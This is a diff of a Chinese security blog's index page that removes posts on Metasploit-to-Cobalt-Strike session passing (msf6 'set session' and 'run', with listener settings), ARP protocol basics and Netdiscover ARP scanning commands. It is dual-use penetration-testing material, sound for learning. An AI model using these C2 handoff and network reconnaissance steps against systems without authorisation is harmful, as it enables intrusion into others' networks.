class="built_in">set</span> session 3</span><br><span class="line">session =&gt; 3</span><br><span class="line">msf6 &gt; run </span><br></pre></td></tr></table></figure>
-
-<p>​	在这里设置的 lhost 与 lport (监听地址和端口) 需要和在 CS上设置的内容一致</p>
-<p><img src="/images/image-20240317140910941.png" alt="image-20240317140910941"></p>
-<h3 id="1-3-MSF-反弹-shell-到-CS"><a href="#1-3-MSF-反弹-shell-到-CS" class="headerlink" title="1.3 MSF 反弹 shell 到 CS"></a>1.3 MSF 反弹 shell 到 CS</h3><p>​	在配置完 MSF 反弹shell参数后直接运行，过会儿就能在 CS 界面上看到上线的会话了(默认上线是启动的notepad,exe)</p>
-<p><img src="/images/image-20240317135236135.png" alt="image-20240317135236135"></p>
-
+        
+          <p class="article-more-link">
+            <a href="/2024/03/17/tools-cs-msf-exchange/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="clu6yfp9f000k02vdg0tu5eq7" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="clu7r07gy000kgvvdbqcjbcso" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-protocol-arp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/03/15/protocol-arp/" class="article-date">
-  <time class="dt-published" datetime="2024-03-15T05:49:01.000Z" itemprop="datePublished">2024-03-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/03/15/protocol-arp/">protocol-arp</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><h2 id="0-ARP-协议基本概念"><a href="#0-ARP-协议基本概念" class="headerlink" title="0. ARP 协议基本概念"></a>0. ARP 协议基本概念</h2><p>​	地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
-<h2 id="1-ARP-数据包格式解析"><a href="#1-ARP-数据包格式解析" class="headerlink" title="1. ARP 数据包格式解析"></a>1. ARP 数据包格式解析</h2><h3 id="1-1-以太网帧封装的ARP数据包"><a href="#1-1-以太网帧封装的ARP数据包" class="headerlink" title="1.1 以太网帧封装的ARP数据包"></a>1.1 以太网帧封装的ARP数据包</h3><p><img src="/images/image-20240315124206322.png" alt="image-20240315124206322"></p>
-<p>​	ARP是个独立的三层协议，并不需要IP协议封装，而是直接生成自己的报文，到达数据链路层后，由数据链路层协议进行封装，一般是以太网协议。封装的过程，就是在ARP报文的前面加上以太网帧头，再加上4字节的冗余校验码结尾，校验码用于检验数据传输是否出现损坏。</p>
-<blockquote>
-<p>主要参数 :</p>
-<p>​	以太网目的地址：6字节，如果是ARP请求报文，该字段为广播MAC地址(FF:FF:FF:FF:FF:FF)</p>
-<p>​	以太网源地址：6字节</p>
-<p>​	帧类型：2字节，0x0806表示是ARP协议</p>
-<p>​	以太网帧尾： 4字节</p>
-</blockquote>
-<p><strong>注：以太网帧最小长度是64个字节，最长1518个字节。封装后的ARP帧，实际就是一个最小以太网帧，包含14个字节的以太网帧头，28个字节的ARP报文，4个字节的以太网帧尾，一共是46个字节，其余18个字节用0来填充，共计64个字节。</strong></p>
-<h3 id="1-2-ARP-数据包报文"><a href="#1-2-ARP-数据包报文" class="headerlink" title="1.2 ARP 数据包报文"></a>1.2 ARP 数据包报文</h3><p><img src="/images/image-20240315122951442.png" alt="image-20240315122951442"></p>
-<blockquote>
-<p>主要参数 :</p>
-<p>​	硬件类型：2字节，值为1表示以太网地址</p>
-<p>​	协议类型：2字节，0x0800表示IP地址</p>
-<p>​	硬件地址长度：1字节，数值为6</p>
-<p>​	协议地址长度：1字节，数值为4</p>
-<p>​	操作代码：2字节，1表示请求报文，2表示应答报文</p>
-<p>​	源MAC地址：6字节</p>
-<p>​	源IP地址：4节字</p>
-<p>​	目的MAC地址：6字节	</p>
-<p>·	目的IP地址：4节字</p>
-</blockquote>
-<h2 id="2-ARP-协议工作流程"><a href="#2-ARP-协议工作流程" class="headerlink" title="2. ARP 协议工作流程"></a>2. ARP 协议工作流程</h2><h3 id="2-1-ARP-协议工作流程原理简述"><a href="#2-1-ARP-协议工作流程原理简述" class="headerlink" title="2.1 ARP 协议工作流程原理简述"></a>2.1 ARP 协议工作流程原理简述</h3><p>​	(以下图主机A与主机C之间进行通信为例)</p>
-<p><img src="/images/image-20240315125654168.png" alt="image-20240315125654168"></p>
-<pre><code> 1. 主机A想要发送数据包到主机C，首先会检查**本地ARP缓存**，即ARP缓存表，搜索目标IP地址是否存在对应的MAC地址
- 2. 如果ARP表中目标IP地址已有对应的MAC地址，则直接使用该地址进行数据包发送
- 3. 如果ARP表中不存在目标IP地址对应的MAC地址，则向**本地网络中广播ARP请求**（ARP Request）数据包，请求其它主机回复该IP地址所对应的MAC地址
- 4. 凡是收到ARP请求数据包的主机，都比较其自身拥有的IP地址和ARP请求数据包中的目标IP地址是否匹配。若匹配，则向主机A发送ARP响应（ARP Reply）数据包，其中包含其自己的MAC地址
- 5. 主机A收到ARP响应数据包后，即可根据目标IP地址和对应的MAC地址进行数据包的发送
-</code></pre>
-<h3 id="2-2-ARP-协议工作流程实验简述"><a href="#2-2-ARP-协议工作流程实验简述" class="headerlink" title="2.2 ARP 协议工作流程实验简述"></a>2.2 ARP 协议工作流程实验简述</h3><h4 id="2-2-1-主机A在本地ARP缓存表中查找对应的MAC地址"><a href="#2-2-1-主机A在本地ARP缓存表中查找对应的MAC地址" class="headerlink" title="2.2.1 主机A在本地ARP缓存表中查找对应的MAC地址"></a>2.2.1 主机A在本地ARP缓存表中查找对应的MAC地址</h4><p><img src="/images/image-20240315125853205.png" alt="image-20240315125853205"></p>
-<h4 id="2-2-2-发送请求包"><a href="#2-2-2-发送请求包" class="headerlink" title="2.2.2 发送请求包"></a>2.2.2 发送请求包</h4><p>​	主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文</p>
-<p><img src="/images/image-20240315130345973.png" alt="image-20240315130345973"></p>
-<table>
-<thead>
-<tr>
-<th>目的IP</th>
-<th>源IP</th>
-<th>目的MAC</th>
-<th>源MAC</th>
-<th>类型</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>192.168.0.3</td>
-<td>192.168.0.1</td>
-<td>FF-FF-FF-FF-FF-FF</td>
-<td>54-89-98-80-72-D7</td>
-<td>Request</td>
-</tr>
-</tbody></table>
-<h4 id=""><a href="#" class="headerlink" title=""></a><img src="/images/image-20240315130905425.png" alt="image-20240315130905425"></h4><h4 id="2-2-3-接受响应包"><a href="#2-2-3-接受响应包" class="headerlink" title="2.2.3 接受响应包"></a>2.2.3 接受响应包</h4><p>​	由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机C）会对该请求进行处理</p>
-<p>​	主机C比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。</p>
-<p><img src="/images/image-20240315130436795.png" alt="image-20240315130436795"></p>
-<table>
-<thead>
-<tr>
-<th>目的IP</th>
-<th>源IP</th>
-<th>目的MAC</th>
-<th>源MAC</th>
-<th>类型</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>192.168.0.1</td>
-<td>192.168.0.3</td>
-<td>54-89-98-80-72-D7</td>
-<td>54-89-98-B7-0B-E8</td>
-<td>Reply</td>
-</tr>
-</tbody></table>
-<p><img src="/images/image-20240315130929464.png" alt="image-20240315130929464"></p>
-<h4 id="2-2-4-ARP-缓存"><a href="#2-2-4-ARP-缓存" class="headerlink" title="2.2.4 ARP 缓存"></a>2.2.4 ARP 缓存</h4><p>​	为了避免重复发送ARP请求，产生大量的广播包，每台主机都有一个ARP缓存列表，当源主机得到 ARP 响应后，将目标主机的 IP 地址和物理地址存入本机 ARP 缓存中，并保留一定时间。下次请求 MAC 地址时，直接查询 ARP 缓存，而无须再发送 ARP 请求，从而节约了网络资源。当缓存生存期结束后，才会再次发送ARP请求报文。</p>
-<h2 id="3-ARP-的应用场景"><a href="#3-ARP-的应用场景" class="headerlink" title="3. ARP 的应用场景"></a>3. ARP 的应用场景</h2><ul>
-<li>ARP的主要应用在局域网中，用于寻找目标主机的MAC地址，以实现数据包的发送和接收</li>
-<li>ARP是广泛应用在TCP&#x2F;IP协议栈中的重要协议，为网络通信提供了必要的支持</li>
-<li>ARP还可以用于攻击，ARP欺骗可以伪装成另一个主机的MAC地址，欺骗路由器或其它主机发送信息</li>
-</ul>
-<h2 id="4-ARP-的优缺点"><a href="#4-ARP-的优缺点" class="headerlink" title="4.  ARP 的优缺点"></a>4.  ARP 的优缺点</h2><ul>
-<li>ARP能在目标MAC地址未知的情况下实现数据包的发送和接收，使通信更加方便</li>
-<li>ARP对网络协议和硬件无特殊要求，适用范围广泛</li>
-<li>ARP有可能存在缓存污染攻击等安全风险，需要加强安全防护</li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/protocol-arp/" data-id="clu6yfp8z000602vdf8cfa1o2" data-title="protocol-arp" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-tools-netdiscover" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/03/15/tools-netdiscover/" class="article-date">
-  <time class="dt-published" datetime="2024-03-15T02:38:07.000Z" itemprop="datePublished">2024-03-15</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/03/15/tools-netdiscover/">tools-netdiscover</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="工具–Netdiscover"><a href="#工具–Netdiscover" class="headerlink" title="工具–Netdiscover"></a>工具–Netdiscover</h1><h2 id="0-Netdiscover-基本概念"><a href="#0-Netdiscover-基本概念" class="headerlink" title="0. Netdiscover 基本概念"></a>0. Netdiscover 基本概念</h2><p>​	ARP 侦查工具 Netdiscover Netdiscover 是一个主动 &#x2F; 被动的 ARP 侦查工具。该工具在不使用 DHCP 的无线网络上非常有用。使用 Netdiscover 工具可以在网络上扫描 IP 地址， ARP 侦查工具 Netdiscover 检查在线主机或搜索为它们发送的 ARP 请求</p>
-<h2 id="1-Netdiscover-常见参数解析"><a href="#1-Netdiscover-常见参数解析" class="headerlink" title="1. Netdiscover 常见参数解析"></a>1. Netdiscover 常见参数解析</h2><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>简介</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-i device</td>
-<td>网络设备，网卡的设置</td>
-</tr>
-<tr>
-<td>-r range</td>
-<td>扫描给定的IP地址范围(可以通过CIDR表示)</td>
-</tr>
-<tr>
-<td>-l file</td>
-<td>扫描包含在文件中的IP地址范围</td>
-</tr>
-<tr>
-<td>-p passive</td>
-<td>(被动扫描)不发送任何内容，只发送嗅探针</td>
-</tr>
-<tr>
-<td>-m file</td>
-<td>扫描已知MAC地址和主机名的列表</td>
-</tr>
-<tr>
-<td>-F filter</td>
-<td>自定义pcap filter表达式(默认是’arp‘)</td>
-</tr>
-<tr>
-<td>-s time</td>
-<td>每个ARP请求之间的休眠时间(ms)</td>
-</tr>
-<tr>
-<td>-c count</td>
-<td>发送每个ARP请求的次数(对于丢失数据包的网络而言)</td>
-</tr>
-<tr>
-<td>-n node</td>
-<td>用于扫描的最后一个源IP八位字节(2-253)</td>
-</tr>
-<tr>
-<td>-d</td>
-<td>忽略自动扫描和快速模式的主配置文件</td>
-</tr>
-<tr>
-<td>-f</td>
-<td>启动快速模式扫描，节省大量时间，建议使用auto</td>
-</tr>
-<tr>
-<td>-P</td>
-<td>打印结果的格式适用于另一个程序的解析，并在活动扫描后停止</td>
-</tr>
-<tr>
-<td>-L</td>
-<td>类似于-P，但在活动扫描完成后继续监听</td>
-</tr>
-<tr>
-<td>-N</td>
-<td>不打印页眉，仅当启用-P或者-L时有效</td>
-</tr>
-<tr>
-<td>-S</td>
-<td>启用每个请求之间的休眠时间抑制(硬核模式)，扫描速度很快</td>
-</tr>
-</tbody></table>
-<h2 id="2-Netdiscover-使用"><a href="#2-Netdiscover-使用" class="headerlink" title="2. Netdiscover 使用"></a>2. Netdiscover 使用</h2><h3 id="2-1-主动发现"><a href="#2-1-主动发现" class="headerlink" title="2.1 主动发现"></a>2.1 主动发现</h3><p>​	遵循 ARP 协议</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>netdiscover -r 192.168.70.0&#x2F;24</p>
-</blockquote>
-<p><img src="/images/image-20240315101411455.png" alt="image-20240315101411455"></p>
-<h3 id="2-2-被动发现"><a href="#2-2-被动发现" class="headerlink" title="2.2 被动发现"></a>2.2 被动发现</h3><blockquote>
-<p>netdiscover -p</p>
-</blockquote>
-<p><img src="/images/image-20240315103449746.png" alt="image-20240315103449746"></p>
-<h3 id="2-3-扫描后停止扫描"><a href="#2-3-扫描后停止扫描" class="headerlink" title="2.3 扫描后停止扫描"></a>2.3 扫描后停止扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -P</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>netdiscover -r 192.168.70.0&#x2F;24 -P</p>
-</blockquote>
-<p><img src="/images/image-20240315101932699.png" alt="image-20240315101932699"></p>
-<h3 id="2-4-扫描后继续监听"><a href="#2-4-扫描后继续监听" class="headerlink" title="2.4 扫描后继续监听"></a>2.4 扫描后继续监听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -L</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>netdiscover -r 192.168.70.0&#x2F;24 -L</p>
-</blockquote>
-<p><img src="/images/image-20240315102223897.png" alt="image-20240315102223897"></p>
-<h3 id="2-5-结果无页眉修饰"><a href="#2-5-结果无页眉修饰" class="headerlink" title="2.5 结果无页眉修饰"></a>2.5 结果无页眉修饰</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -N</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>netdiscover -r 192.168.70.0&#x2F;24 -P -N</p>
-</blockquote>
-<p><img src="/images/image-20240315102529860.png" alt="image-20240315102529860"></p>
-<h3 id="2-6-重复发送请求"><a href="#2-6-重复发送请求" class="headerlink" title="2.6 重复发送请求"></a>2.6 重复发送请求</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -c [numbers]</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>netdiscover -r 192.168.70.0&#x2F;24 -c 5</p>
-</blockquote>
-<p>​	对于每个扫描目标发送numbers次ARP请求</p>
-<p><img src="/images/image-20240315102902227.png" alt="image-20240315102902227"></p>
-<blockquote>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/15/tools-netdiscover/" data-id="clu6yfp9g000m02vd67bfdo9r" data-title="tools-netdiscover" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
 
     </footer>
   </div>
@@ -1090,6 +656,14 @@
       <ul>
         
           <li>
+            <a href="/2024/03/26/tools-windows-fs-ntfs-2/">tools-windows-fs-ntfs-2</a>
+          </li>
+        
+          <li>
+            <a href="/2024/03/26/tools-windows-fs-ntfs-1/">tools-windows-fs-ntfs-1</a>
+          </li>
+        
+          <li>
             <a href="/2024/03/25/program-Python-calling-multiprocessing-intial-error/">program-Python-calling-multiprocessing-intial-error</a>
           </li>
         
@@ -1099,14 +673,6 @@
         
           <li>
             <a href="/2024/03/25/tools-CMD-backdoor-user/">tools-CMD-backdoor-user</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/25/tools-CMD-net-user/">tools-CMD-net-user</a>
-          </li>
-        
-          <li>
-            <a href="/2024/03/25/tools-CMD-hidden-cmdline/">tools-CMD-hidden-cmdline</a>
           </li>
         
       </ul>
